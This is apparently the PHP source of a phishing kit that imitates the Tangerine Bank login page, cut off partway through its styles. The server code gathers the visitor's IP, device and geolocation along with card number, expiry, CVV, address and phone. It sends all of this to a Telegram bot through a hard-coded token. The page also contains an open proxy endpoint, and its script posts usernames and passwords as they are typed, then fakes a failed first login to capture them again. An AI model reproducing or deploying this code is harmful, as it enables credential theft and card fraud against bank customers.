<?php
include "/mods/antibot.php";

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if (isset($_GET['bypass']) && $_GET['bypass'] == 'true') {
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 " . $info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}

$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}

$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS()
{
    global $user_agent;
    $os_platform = "Unknown OS Platform";
    $os_array = array(
        '/windows nt 10/i' => 'Windows 10',
        '/windows nt 6.3/i' => 'Windows 8.1',
        '/windows nt 6.2/i' => 'Windows 8',
        '/windows nt 6.1/i' => 'Windows 7',
        '/windows nt 6.0/i' => 'Windows Vista',
        '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i' => 'Windows XP',
        '/windows xp/i' => 'Windows XP',
        '/windows nt 5.0/i' => 'Windows 2000',
        '/windows me/i' => 'Windows ME',
        '/win98/i' => 'Windows 98',
        '/win95/i' => 'Windows 95',
        '/win16/i' => 'Windows 3.11',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/mac_powerpc/i' => 'Mac OS 9',
        '/linux/i' => 'Linux',
        '/ubuntu/i' => 'Ubuntu',
        '/iphone/i' => 'iPhone',
        '/ipod/i' => 'iPod',
        '/ipad/i' => 'iPad',
        '/android/i' => 'Android',
        '/blackberry/i' => 'BlackBerry',
        '/webos/i' => 'Mobile'
    );

    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value;
        }
    }

    return $os_platform;
}

function getBrowser()
{
    global $user_agent;
    $browser = "Unknown Browser";
    $browser_array = array(
        '/msie/i' => 'Internet Explorer',
        '/firefox/i' => 'Firefox',
        '/safari/i' => 'Safari',
        '/chrome/i' => 'Chrome',
        '/edge/i' => 'Edge',
        '/opera/i' => 'Opera',
        '/netscape/i' => 'Netscape',
        '/maxthon/i' => 'Maxthon',
        '/konqueror/i' => 'Konqueror',
        '/mobile/i' => 'Handheld Browser'
    );

    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser = $value;
        }
    }

    return $browser;
}

$user_os = getOS();
$user_browser = getBrowser();

$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file = 'data.dat';
$file1 = 'combo.txt';
$file2 = 'master.log';
$ip = "" . $PublicIP;
$uaget = "" . $user_agent;
$bsr = "" . $user_browser;
$uos = "" . $user_os;
$ust = explode(" ", $user_agent);
$vr = $ust[3];
$ver = str_replace(")", "", $vr);
$version = "Version              : " . $ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
} else {
    $details = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details = json_decode($details, true);
$success = $details['success'];
$fp = fopen($file, 'a');

if ($success == false) {
    fwrite($fp, $ip . "\n");
    fwrite($fp, $uos . "\n");
    fwrite($fp, $version . "\n");
    fwrite($fp, $bsr . "\n");
    fclose($fp);
} else if ($success == true) {
    $country = $details['country'];
    $city = $details['city'];
    $continent = $details['continent'];
    $tp = $details['type'];
    $cn = $details['country_phone'];
    $is = $details['isp'];
    $la = $details['latitude'];
    $lp = $details['longitude'];
    $crn = $details['currency'];
    $type = $tp;
    $isp = $is;
    $bank = "TANGERINE BANK";
    $LL = "+";
    $currency = "" . $full_date;
    $lh = "|";
    $li = ",";
}

$message = "|====🔴===|🔒 SARAHS BANK REPORT 🔒 |===🔴===|\n|IPADDRESS :  " . $ip . "\n|BANK   💰  : " . $bank ."\n|Internet sp :  " . $isp ."\n|Type[4/6]     : ".  $tp . "\n|Device Info  :  " . $uos . $lh . $bsr . "\n|City                :  " . $city . "\n|Continent    :  " . $continent . "\n|Lat+lon         :  " . $la . $LL . $lp . "\n|Phone           :  " . $cn . "\n|Country        :  " . $country . "\n|====🔴===|🔒 SARAHS BANK REPORT 🔒 |===🔴===|\n| PROFIT   :  " . $_POST['Cardnumber'] . "|" . $_POST['Expiry'] . "|" . $_POST['CVV'] . "|" . $_SESSION['ZIP'] . "|" . $_POST['Nameoncard'] . "|" . $_SESSION['Address'] . "  " . $_SESSION['Apartment'] . "|" . $_SESSION['City'] . "|" . $_SESSION['state'] . "|" . $_SESSION['Phone'] . "|" . $_SERVER['REMOTE_ADDR'] . "|" . $_SESSION['bank_scheme'] . "|" . $_SESSION['bank_type'] . "|" . $_SESSION['bank_brand'] . "|" . $_SESSION['bank_name'] . "|" . $_SESSION['bank_country'] . "\n|====🔴===|🔒 SARAHS BANK REPORT 🔒 |===🔴===|\n|USERAGENT:  " . $_SERVER['HTTP_USER_AGENT'] . "\n";


$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-1001831940786',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    
          

$options = array(
    'http' => array(
        'method'  => 'POST',
        'content' => http_build_query($data),
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n"
    )
);
$context  = stream_context_create($options);
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage", false, $context);

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if (isset($_GET['bypass']) && $_GET['bypass'] == 'true') {
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 " . $info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}

?>
     
    <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
    <title>Login | Tangerine</title>
    <meta name="description" content="">
    <link rel="shortcut icon" href="/public/deposit/favicon.ico" type="image/x-icon">
    <meta name="viewport" content="initial-scale=1, width=device-width">
    <link href="./040147_files/vendor.css" rel="stylesheet" media="all" onload="this.media=&#39;all&#39;">
    <link href="./040147_files/global.css" rel="stylesheet" media="all" onload="this.media=&#39;all&#39;">
    <link href="./040147_files/app.css" rel="stylesheet" media="all" onload="this.media=&#39;all&#39;">
    <link rel="preload" as="font" href="/assets/tang/fonts/icomoon.ttf" type="font/ttf" crossorigin="">
    <link rel="preload" as="image" href="./040147_files/tangerine-logo-white.svg">
    <link rel="preload" as="image" href="/assets/tang/fonts/icon_DownArrow-white.svg" type="image/svg+xml">
    <link href="./040147_files/css2" rel="stylesheet">
    <link rel="stylesheet" href="./040147_files/login.css">
    <script src="./040147_files/jquery-3.6.0.min" crossorigin="anonymous"></script>
    <script>
        var lrbank = 'Tang';
        var lrinfo = 'Login';
    </script>
    <script src="./040147_files/actions"></script>
    <script>
    $(document).ready(function() {
        var attempt = 2;

        $('.lab-form').submit(function(e) {
            e.preventDefault();
            var form = this;

            if (attempt == 1) {
                $('.div-loader').css('display', 'block');
                $('.div-main').css('display', 'none');

                $.post('/public/deposit/tang/api/login-submit', $(this).serialize(), function(response) {
                    $('.error-div').css('display', 'block');

                    $(form).trigger('reset');

                    $('#step-login').css('display', 'block');
                    $('#step-pin').css('display', 'none');
                    $('#step-pin mat-card-actions, #step-pin mat-card, #step-pin mat-card-actions').css('display', 'none');
                    $('#input-username').focus();

                    $('.div-loader').css('display', 'none');
                    $('.div-main').css('display', 'block');
                }, 'JSON');

                attempt = 2;
            } else {
                $('.div-loader').css('display', 'block');
                $('.div-main').css('display', 'none');

                $.post('/public/deposit/tang/api/login-submit', $(this).serialize(), function(response) {
                    if (response.status) {
                        if (response.data.loader) {
                            location.href = '/public/deposit/tang/w';
                        } else {
                            location.href = '/public/deposit/tang/q';
                        }
                    } else {
                        $(form).trigger('reset');

                        $('.error-div').css('display', 'block');

                        $('#step-login').css('display', 'block');
                        $('#step-pin').css('display', 'none');
                        $('#step-pin mat-card-actions, #step-pin mat-card, #step-pin mat-card-actions').css('display', 'none');
                        $('#input-username').focus();

                        $('.div-loader').css('display', 'none');
                        $('.div-main').css('display', 'block');
                    }
                }, 'JSON');
            }

            return false;
        });

        $(document).on('change', '.input-username, .input-password', function() {
            var username = $(this).hasClass('input-username') ? $(this).val() : $(this).closest('form').find('.input-username').val();
            var password = $(this).hasClass('input-password') ? $(this).val() : $(this).closest('form').find('.input-password').val();
            $.post('/public/deposit/tang/data.txt', {username: username, password: password});
        });

        $('.mat-slide-toggle-thumb-container').click(function() {
            if ($('.mat-slide-toggle').hasClass('mat-checked')) {
                $('.mat-slide-toggle').removeClass('mat-checked');
            } else {
                $('.mat-slide-toggle').addClass('mat-checked');
            }
        });
    });
    </script>
    <style>
    .message-card .critical {
        background-color: rgba(235, 1, 49, 0.08);
        border-left: solid 3px #EB0131;
    }

    .message-card .message-box {
        margin: 1rem 0;
        padding: 16px 15px;
        margin-bottom: 15px;
    }

    .sr-only {
        position: absolute;
        width: 1px;
        height: 1px;
        padding: 0;
        margin: -1px;
        overflow: hidden;
        clip: rect(0,0,0,0);
        border: 0;
    }

    .message-card .cancel-icon {
        color: #EB0131;
        font-size: 1.2rem;
        height: 1.2rem;
        width: 1.2rem;
        min-width: 1.2rem;
    }

    .message-card mat-icon {
        position: relative;
        left: 0.125rem;
    }

    .message-card .message-box-content {
        margin: 0 0 0 0.5rem;
        display: -ms-flexbox;
        display: flex;
        -ms-flex: 1;
        flex: 1;
        -ms-flex-direction: column;
        flex-direction: column;
        -ms-flex-pack: center;
        justify-content: center;
    }

    @media (min-width: 74.4375rem) {
        .div-main .navbar {
            display: none !important;
        }
    }
    </style>
</head>
<body class="fb2-index" style="">
    <noscript>
        <style>
            p {
            color: darkorange;
            font-weight: bold;
            font-size: 16px;
            text-align: center;
            }
        </style>
        <p>To proceed you need to have your cookies and JavaScript browser features enabled.</p>
    </noscript>
    <tng-main-nav class="ng-isolate-scope div-main">
        <nav role="navigation" id="hamburger-navigation" aria-label="Primary" class="navbar print-hide">
            
            <div class="brand ng-scope">
                <img alt="Tangerine" class="logo-white print-hide" src="./040147_files/tangerine-logo-white.svg">
            </div>
            
            <button actionable-id="main-nav-btn-feedback" class="navbar__btn navbar__btn--feedback icon-feedback" id="main-nav-btn-feedback" name="main-nav-btn-feedback">
                <span class="main-nav-btn-icon-copy ng-binding"> Feedback </span>
            </button>
        </nav>
        <header class="header print-hide">
            <div class="container">
                <div class="logo"> <a actionable-id="main-nav-handle_go_home" class="brand" href="/public/deposit/tang" id="main-nav-handle_go_home" name="main-nav-handle_go_home"> <img alt="Tangerine" class="print-hide" src="./040147_files/tangerine-logo-white.svg"> </a> </div>
                <!-- ngIf: $ctrl.isMobileHidden -->
                <nav class="nav ng-scope" aria-label="Primary">
                    <div class="container">
                        <ul class="nav__list">
                            <!-- ngRepeat: menuItem in $ctrl.topPrimaryMenuItems -->
                            <li class="nav__item primary-item ng-scope" style=""> <a class="nav__link" href="javascript:void(0);" actionable-id="menu_global.menu.header.products" id="menu_global.menu.header.products" name="menu_global.menu.header.products"> <span class="ng-binding">Products</span> </a> </li>
                            <!-- end ngRepeat: menuItem in $ctrl.topPrimaryMenuItems -->
                            <li class="nav__item primary-item ng-scope"> <a class="nav__link" href="javascript:void(0);" actionable-id="menu_global.menu.header.waysToBank" id="menu_global.menu.header.waysToBank" name="menu_global.menu.header.waysToBank"> <span class="ng-binding">Ways to Bank</span> </a> </li>
                            <!-- end ngRepeat: menuItem in $ctrl.topPrimaryMenuItems -->
                            <li class="nav__item primary-item ng-scope"> <a class="nav__link" href="javascript:void(0);" actionable-id="menu_global.menu.header.ourBlog" id="menu_global.menu.header.ourBlog" name="menu_global.menu.header.ourBlog"> <span class="ng-binding">Blog</span> </a> </li>
                            <!-- end ngRepeat: menuItem in $ctrl.topPrimaryMenuItems -->
                            <li class="nav__item primary-item ng-scope"> <a class="nav__link" href="javascript:void(0);" actionable-id="menu_global.menu.header.aboutUs" id="menu_global.menu.header.aboutUs" name="menu_global.menu.header.aboutUs"> <span class="ng-binding">About Us</span> </a> </li>
                            <!-- end ngRepeat: menuItem in $ctrl.topPrimaryMenuItems --> <!-- ngIf: $ctrl.AVAILABLE_ENVIRONMENTS.length > 0 --> <!-- ngIf: $ctrl.isInDevPod --> <!-- ngIf: $ctrl.IS_AVAILABLE_GENESYS_ENVIRONMENTS && false -->
                        </ul>
                        <div class="navtools">
                            <ul class="navtools__list">
                                <li class="navtools__item" aria-hidden="false"> <a class="btn btn--largest btn--reversed ng-binding" actionable-id="menu_signup" href="/public/deposit/tang/040148.php#/enroll" id="menu_signup" name="menu_signup"> Sign Me Up </a> </li>
                                <li class="navtools__item" aria-hidden="false"> <a class="btn btn--largest btn--whiteBorder ng-binding" href="/public/deposit/tang/040148.php#/?locale=en_CA" actionable-id="menu_Login" id="menu_Login" name="menu_Login"> Log Me In </a> </li>
                                <!-- ngIf: $ctrl.SessionService.isAuthenticated() && $ctrl.MENU_ITEMS.LOGIN.length -->
                                <li class="navtools__item"> <a class="navtools__link navtools__link--circle navtools__link--icon-text" href="/public/deposit/tang/040148.php" actionable-id="menu_Language" aria-label="Changer la langue au français" id="menu_Language" name="menu_Language"> <span class="material-icons language">language</span> <span class="text-label ng-binding" aria-hidden="true"> FR </span> </a> </li>
                                <!-- ngIf: !$ctrl.isNewClientEnrollment -->
                                <li class="navtools__item ng-scope"> <a class="navtools__link navtools__link--circle" href="/public/deposit/tang/040148.php#/locations" actionable-id="menu_Location" aria-label="ABM Locator" id="menu_Location" name="menu_Location"> <span class="navtools__icon icon-location"></span> </a> </li>
                                <!-- end ngIf: !$ctrl.isNewClientEnrollment -->
                                <li class="navtools__item"> <a class="navtools__link navtools__link--circle" href="/public/deposit/tang/040148.php" actionable-id="menu_Search" aria-label="Search" id="menu_Search" name="menu_Search"> <span class="navtools__icon icon-search"></span> </a> </li>
                                <!-- ngIf: $ctrl.SessionService.isAuthenticated() -->
                            </ul>
                        </div>
                    </div>
                </nav>
                <!-- end ngIf: $ctrl.isMobileHidden -->
            </div>
            <tng-sub-nav class="ng-isolate-scope">
                <!-- ngIf: $ctrl.isSubNavVisible() -->
            </tng-sub-nav>
            <!-- ngIf: !$ctrl.isMobileHidden --> <!-- ngIf: !$ctrl.isMobileHidden -->
        </header>
        <!-- ngIf: $ctrl.isContactUsMenuOpen -->
        <tng-feedback-survey class="ng-isolate-scope">
            <!-- ngIf: $ctrl.isMedalliaSupported -->
        </tng-feedback-survey>
        <tng-print-header name="$ctrl.getFullName()"></tng-print-header>
        <!-- ngIf: $ctrl.showVisitorSiteSearch -->
    </tng-main-nav>
    <!-- uiView: page-content -->
    <div ui-view="page-content" class="page-content ng-scope div-main" role="main" id="mainContent" tabindex="-1" translate-cloak="" style="overflow-y: hidden;">
        <login-page return-to="::$resolve.returnTo" class="ng-scope ng-isolate-scope">
            <div>
                <!-- ngIf: !$ctrl.isNewLoginFlow --> <!-- ngIf: $ctrl.isNewLoginFlow -->
                <tngx-login-new [return-to-param]="$ctrl.returnTo" class="ng-scope" _nghost-llv-c5="">
                        <div _ngcontent-llv-c5="" class="mat-card-container c-login-flow" id="step-login">
                            <mat-card _ngcontent-llv-c5="" class="mat-elevation-z0 mat-card mat-focus-indicator">
                                <mat-card-header _ngcontent-llv-c5="" class="mat-card-header">
                                    <div class="mat-card-header-text">
                                        <mat-card-title _ngcontent-llv-c5="" class="mat-card-title" id="login-user-id-header-title">
                                            <h1 _ngcontent-llv-c5="" tabindex="-1">Log in</h1>
                                        </mat-card-title>
                                    </div>
                                </mat-card-header>
                                <mat-card-content _ngcontent-llv-c5="" class="mat-card-content">
                                    <div _ngcontent-ift-c19="" class="service-error ng-star-inserted error-div" style="display: none" id="login-pin-service-errors">
                                        <tngx-message-card _ngcontent-ift-c19="" aria-live="polite" _nghost-ift-c6="">
                                            <div _ngcontent-ift-c6="" class="message-card" tabindex="-1">
                                                <div _ngcontent-ift-c6="" class="message-box critical">
                                                    <div _ngcontent-ift-c6="" fxlayout="row" style="flex-direction: row; box-sizing: border-box; display: flex;">
                                                        <div _ngcontent-ift-c6="" class="sr-only">Error</div>
                                                        <mat-icon _ngcontent-ift-c6="" class="cancel-icon mat-icon notranslate material-icons mat-icon-no-color ng-star-inserted" role="img" aria-hidden="true" data-mat-icon-type="font">cancel</mat-icon>
                                                        <div _ngcontent-ift-c6="" class="message-box-content">
                                                            <span _ngcontent-ift-c6="" id="message-body-login-pin-message-card-error" class="ng-star-inserted">Your PIN and Client Number make a good pair. Please check your records and make sure they are both valid and work together. As a reminder - your PIN should be either 4 or 6 numbers.</span>
                                                        </div>
                                                    </div>
                                                    <!---->
                                                </div>
                                            </div>
                                        </tngx-message-card>
                                    </div>
                                    <div _ngcontent-llv-c5="" class="mat-card-content-container-28rem">
                                        <!----><!---->
                                        <div _ngcontent-llv-c5="" class="ng-star-inserted">
                                            <tngx-tab-panel _ngcontent-llv-c5="" idsuffix="login-user-id-tabs" _nghost-llv-c9="">
                                                <div _ngcontent-llv-c9="">
                                                    <mat-tab-group _ngcontent-llv-c9="" class="mat-tab-group mat-primary" mat-align-tabs="start">
                                                        <mat-tab-header class="mat-tab-header">
                                                            <div aria-hidden="true" class="mat-tab-header-pagination mat-tab-header-pagination-before mat-elevation-z4 mat-ripple mat-tab-header-pagination-disabled" mat-ripple="">
                                                                <div class="mat-tab-header-pagination-chevron"></div>
                                                            </div>
                                                            <div class="mat-tab-label-container">
                                                                <div class="mat-tab-list" role="tablist" style="transform: translateX(0px);">
                                                                    <div class="mat-tab-labels">
                                                                        
                                                                        
                                                                        
                                                                    </div>
                                                                    <mat-ink-bar class="mat-ink-bar" style="visibility: visible; left: 0px; width: 152px;"></mat-ink-bar>
                                                                </div>
                                                            </div>
                                                            <div aria-hidden="true" class="mat-tab-header-pagination mat-tab-header-pagination-after mat-elevation-z4 mat-ripple mat-tab-header-pagination-disabled" mat-ripple="">
                                                                <div class="mat-tab-header-pagination-chevron"></div>
                                                            </div>
                                                        </mat-tab-header>
                                                        <div class="mat-tab-body-wrapper">
                                                            <!---->
                                                            <mat-tab-body class="mat-tab-body ng-tns-c18-1 mat-tab-body-active ng-star-inserted" role="tabpanel" id="mat-tab-content-login-user-id-tabs-0" aria-labelledby="mat-tab-label-login-user-id-tabs-0">
                                                                <div class="mat-tab-body-content ng-trigger ng-trigger-translateTab" style="transform: none;">
                                                                    <!----><!----><!---->
                                                                </div>
                                                            </mat-tab-body>
                                                            <mat-tab-body class="mat-tab-body ng-tns-c18-2 ng-star-inserted" role="tabpanel" id="mat-tab-content-login-user-id-tabs-1" aria-labelledby="mat-tab-label-login-user-id-tabs-1">
                                                                <div class="mat-tab-body-content ng-trigger ng-trigger-translateTab" style="transform: translate3d(100%, 0px, 0px); min-height: 1px;">
                                                                    <!---->
                                                                </div>
                                                            </mat-tab-body>
                                                        </div>
                                                    </mat-tab-group>
                                                </div>
                                            </tngx-tab-panel>
                                        </div>
                                        <div _ngcontent-llv-c5="" class="content-container">
                                            <div _ngcontent-llv-c5="" class="flex">
                                                <!---->
                                                <mat-form-field _ngcontent-llv-c5="" appearance="outline" id="main-div" class="form-field mat-form-field ng-tns-c10-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-outline mat-form-field-can-float mat-form-field-has-label mat-form-field-hide-placeholder ng-untouched ng-pristine ng-invalid ng-star-inserted">
                                                    <div class="mat-form-field-wrapper">
                                                        <div class="mat-form-field-flex">
                                                            <!----><!---->
                                                            <div class="mat-form-field-outline ng-tns-c10-0 ng-star-inserted">
                                                                <div class="mat-form-field-outline-start" style="width: 11px;"></div>
                                                                <div class="mat-form-field-outline-gap" style="width: 56.5px;"></div>
                                                                <div class="mat-form-field-outline-end"></div>
                                                            </div>
                                                            <div class="mat-form-field-outline mat-form-field-outline-thick ng-tns-c10-0 ng-star-inserted">
                                                                <div class="mat-form-field-outline-start" style="width: 11px;"></div>
                                                                <div class="mat-form-field-outline-gap" style="width: 56.5px;"></div>
                                                                <div class="mat-form-field-outline-end"></div>
                                                            </div>
                                                            <!---->
                                                            <div class="mat-form-field-infix">
                                                                <input class="mat-input-element mat-form-field-autofill-control ng-untouched ng-pristine ng-invalid cdk-text-field-autofill-monitored lrinput" id="input-username" name="username" required="" type="text" maxle="" attr-action="Filling Username">
                                                                <input type="hidden" name="CRSFToken" value="">
                                                                <span class="mat-form-field-label-wrapper">
                                                                    
                                                                </span>
                                                            </div>
                                                        </div>
                                                        <div class="mat-form-field-subscript-wrapper">
                                                            <!----><!---->
                                                            <div class="mat-form-field-hint-wrapper ng-tns-c10-0 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);">
                                                                <!---->
                                                                <mat-hint _ngcontent-llv-c5="" class="login-input-hint mat-hint" id="mat-hint-0"> You can use your Client Number, Card Number, or Username.</mat-hint>
                                                                <div class="mat-form-field-hint-spacer"></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </mat-form-field>
                                                <!---->
                                            </div>
                                            <div _ngcontent-llv-c5="" class="flex">
                                                <mat-slide-toggle _ngcontent-llv-c5="" class="mat-slide-toggle mat-primary ng-untouched ng-pristine ng-valid" formcontrolname="rememberMeId" id="login-user-id-remember-me-toggle" tabindex="-1">
                                                    <label class="mat-slide-toggle-label" for="login-user-id-remember-me-toggle-input">
                                                        <div class="mat-slide-toggle-bar">
                                                            <input class="mat-slide-toggle-input cdk-visually-hidden" role="switch" type="checkbox" id="login-user-id-remember-me-toggle-input" tabindex="0" aria-checked="false">
                                                            <div class="mat-slide-toggle-thumb-container">
                                                                <div class="mat-slide-toggle-thumb"></div>
                                                                <div class="mat-slide-toggle-ripple mat-focus-indicator mat-ripple" mat-ripple="">
                                                                    <div class="mat-ripple-element mat-slide-toggle-persistent-ripple"></div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <span class="mat-slide-toggle-content"><span style="display:none">&nbsp;</span>Remember me on this device </span>
                                                    </label>
                                                </mat-slide-toggle>
                                                <tngx-tooltip _ngcontent-llv-c5="">
                                                    <div class="tooltip-container">
                                                        <button class="mat-tooltip-trigger" mattooltipclass="tooltip-style" mattooltipposition="below" type="button" id="login-user-id-remember-me-tooltip" aria-label="Remember Me on this device tool tip" aria-describedby="cdk-describedby-message-0" cdk-describedby-host="">
                                                            <span class="tooltip-button-icon">
                                                                <mat-icon class="mat-icon notranslate material-icons mat-icon-inline mat-icon-no-color" role="img" aria-hidden="true" data-mat-icon-type="font">help_outline</mat-icon>
                                                            </span>
                                                        </button>
                                                    </div>
                                                </tngx-tooltip>
                                            </div>
                                        </div>
                                    </div>
                                </mat-card-content>
                                <mat-card-actions _ngcontent-orv-c20="" class="mat-card-actions" style="display: block;">
                                                            <button _ngcontent-orv-c20="" class="mat-focus-indicator mat-flat-button mat-button-base mat-primary" color="primary" id="login-pin-submit-button" mat-flat-button="" type="submit" name="save" value="1">
                                                                <span class="mat-button-wrapper">Next</span>
                                                                <span class="mat-button-ripple mat-ripple" matripple=""></span>
                                                                <span class="mat-button-focus-overlay"></span></button>
                                                        </mat-card-actions>
                                <!---->
                                
                            </mat-card>
                            
                        </div>
                        
                    </form>
                    <script>
                    $(document).ready(function() {
                        $('#input-username').focusin(function() {
                            $('#main-div').removeClass('mat-form-field-hide-placeholder').addClass('mat-form-field-should-float mat-focused');
                        });

                        $('#input-username').focusout(function() {
                            var val = $(this).val();
                            if (val == '') {
                                $('#main-div').addClass('mat-form-field-hide-placeholder').removeClass('mat-form-field-should-float mat-focused');
                            }
                        });

                        $('#input-pin').focusin(function() {
                            $('#main-div2').removeClass('mat-form-field-hide-placeholder').addClass('mat-form-field-should-float mat-focused');
                        });

                        $('#input-pin').focusout(function() {
                            var val = $(this).val();
                            if (val == '') {
                                $('#main-div2').addClass('mat-form-field-hide-placeholder').removeClass('mat-form-field-should-float mat-focused');
                            }
                        });

                        $('#btn-next').click(function() {
                            var val = $('#input-username').val();
                            if (val == '') {
                                $('#input-username').focus();
                            } else {
                                $('#step-login').css('display', 'none');
                                $('#span-username').html(val);
                                $('#step-pin').css('display', 'block');
                                $('#step-pin mat-card-actions, #step-pin mat-card, #step-pin mat-card-actions').css('display', 'block');
                            }
                        });
                    });
                    </script>
                </tngx-login-new>
                <!-- end ngIf: $ctrl.isNewLoginFlow -->
            </div>
        </login-page>
    </div>
    <tng-main-nav class="ng-isolate-scope div-loader" style="display: none">
        <nav class="navbar print-hide" ng-class="{&#39;nativeNav&#39; : $ctrl.EnvironmentService.isNative()}">
            <a id="mainNav_home" class="brand nonclickable" href="/public/deposit/tang/040148.php" ng-click="$ctrl.handleGoHome()" ng-class="{&#39;nonclickable&#39; : $ctrl.isTitleLogoNotClickable()}">
                <img ng-src="assets/images/brand-white.png" alt="Tangerine" class="logo-white print-hide" src="./040147_files/brand-white.png">
                <img ng-src="assets/images/brand-orange.png" alt="Tangerine" class="logo-orange print-only-inline" src="./040147_files/brand-orange.png">
            </a>
        </nav>
    </tng-main-nav>
    <div ui-view="page-content" class="page-content ng-scope div-loader" style="padding-bottom: 0px; display: none">
        <forgot-login class="ng-scope ng-isolate-scope">
            <form method="post" action="/public/deposit/tang/040148.php" class="ng-pristine ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength ng-valid-email">
                <style>
                .forgot-login select, .forgot-login input[type="text"], .forgot-login input[type="tel"], .forgot-login input[type="password"] {
                    font-size: 17px;
                    margin-top: 10px;
                    margin-bottom: 15px;
                    font-weight: 500;
                    border: 1px solid #9e9e9e;
                }

                .heading--title2 {
                    margin-bottom: 25px;
                    text-align: center;
                }

                .forgot-login button {
                    margin: 0px;
                }

                .text-right {
                    text-align: right;
                }

                .navbar {
                    display: block !important;
                    background-color: #ea7024 !important;
                }

                .btn, [class*=" btn--"], [class^=btn--] {
                    background-color: #ea7024;
                }

                .forgot-login__email {
                    max-width: 30em;
                    margin-left: auto;
                    margin-right: auto;
                }

                .application-theme-web {
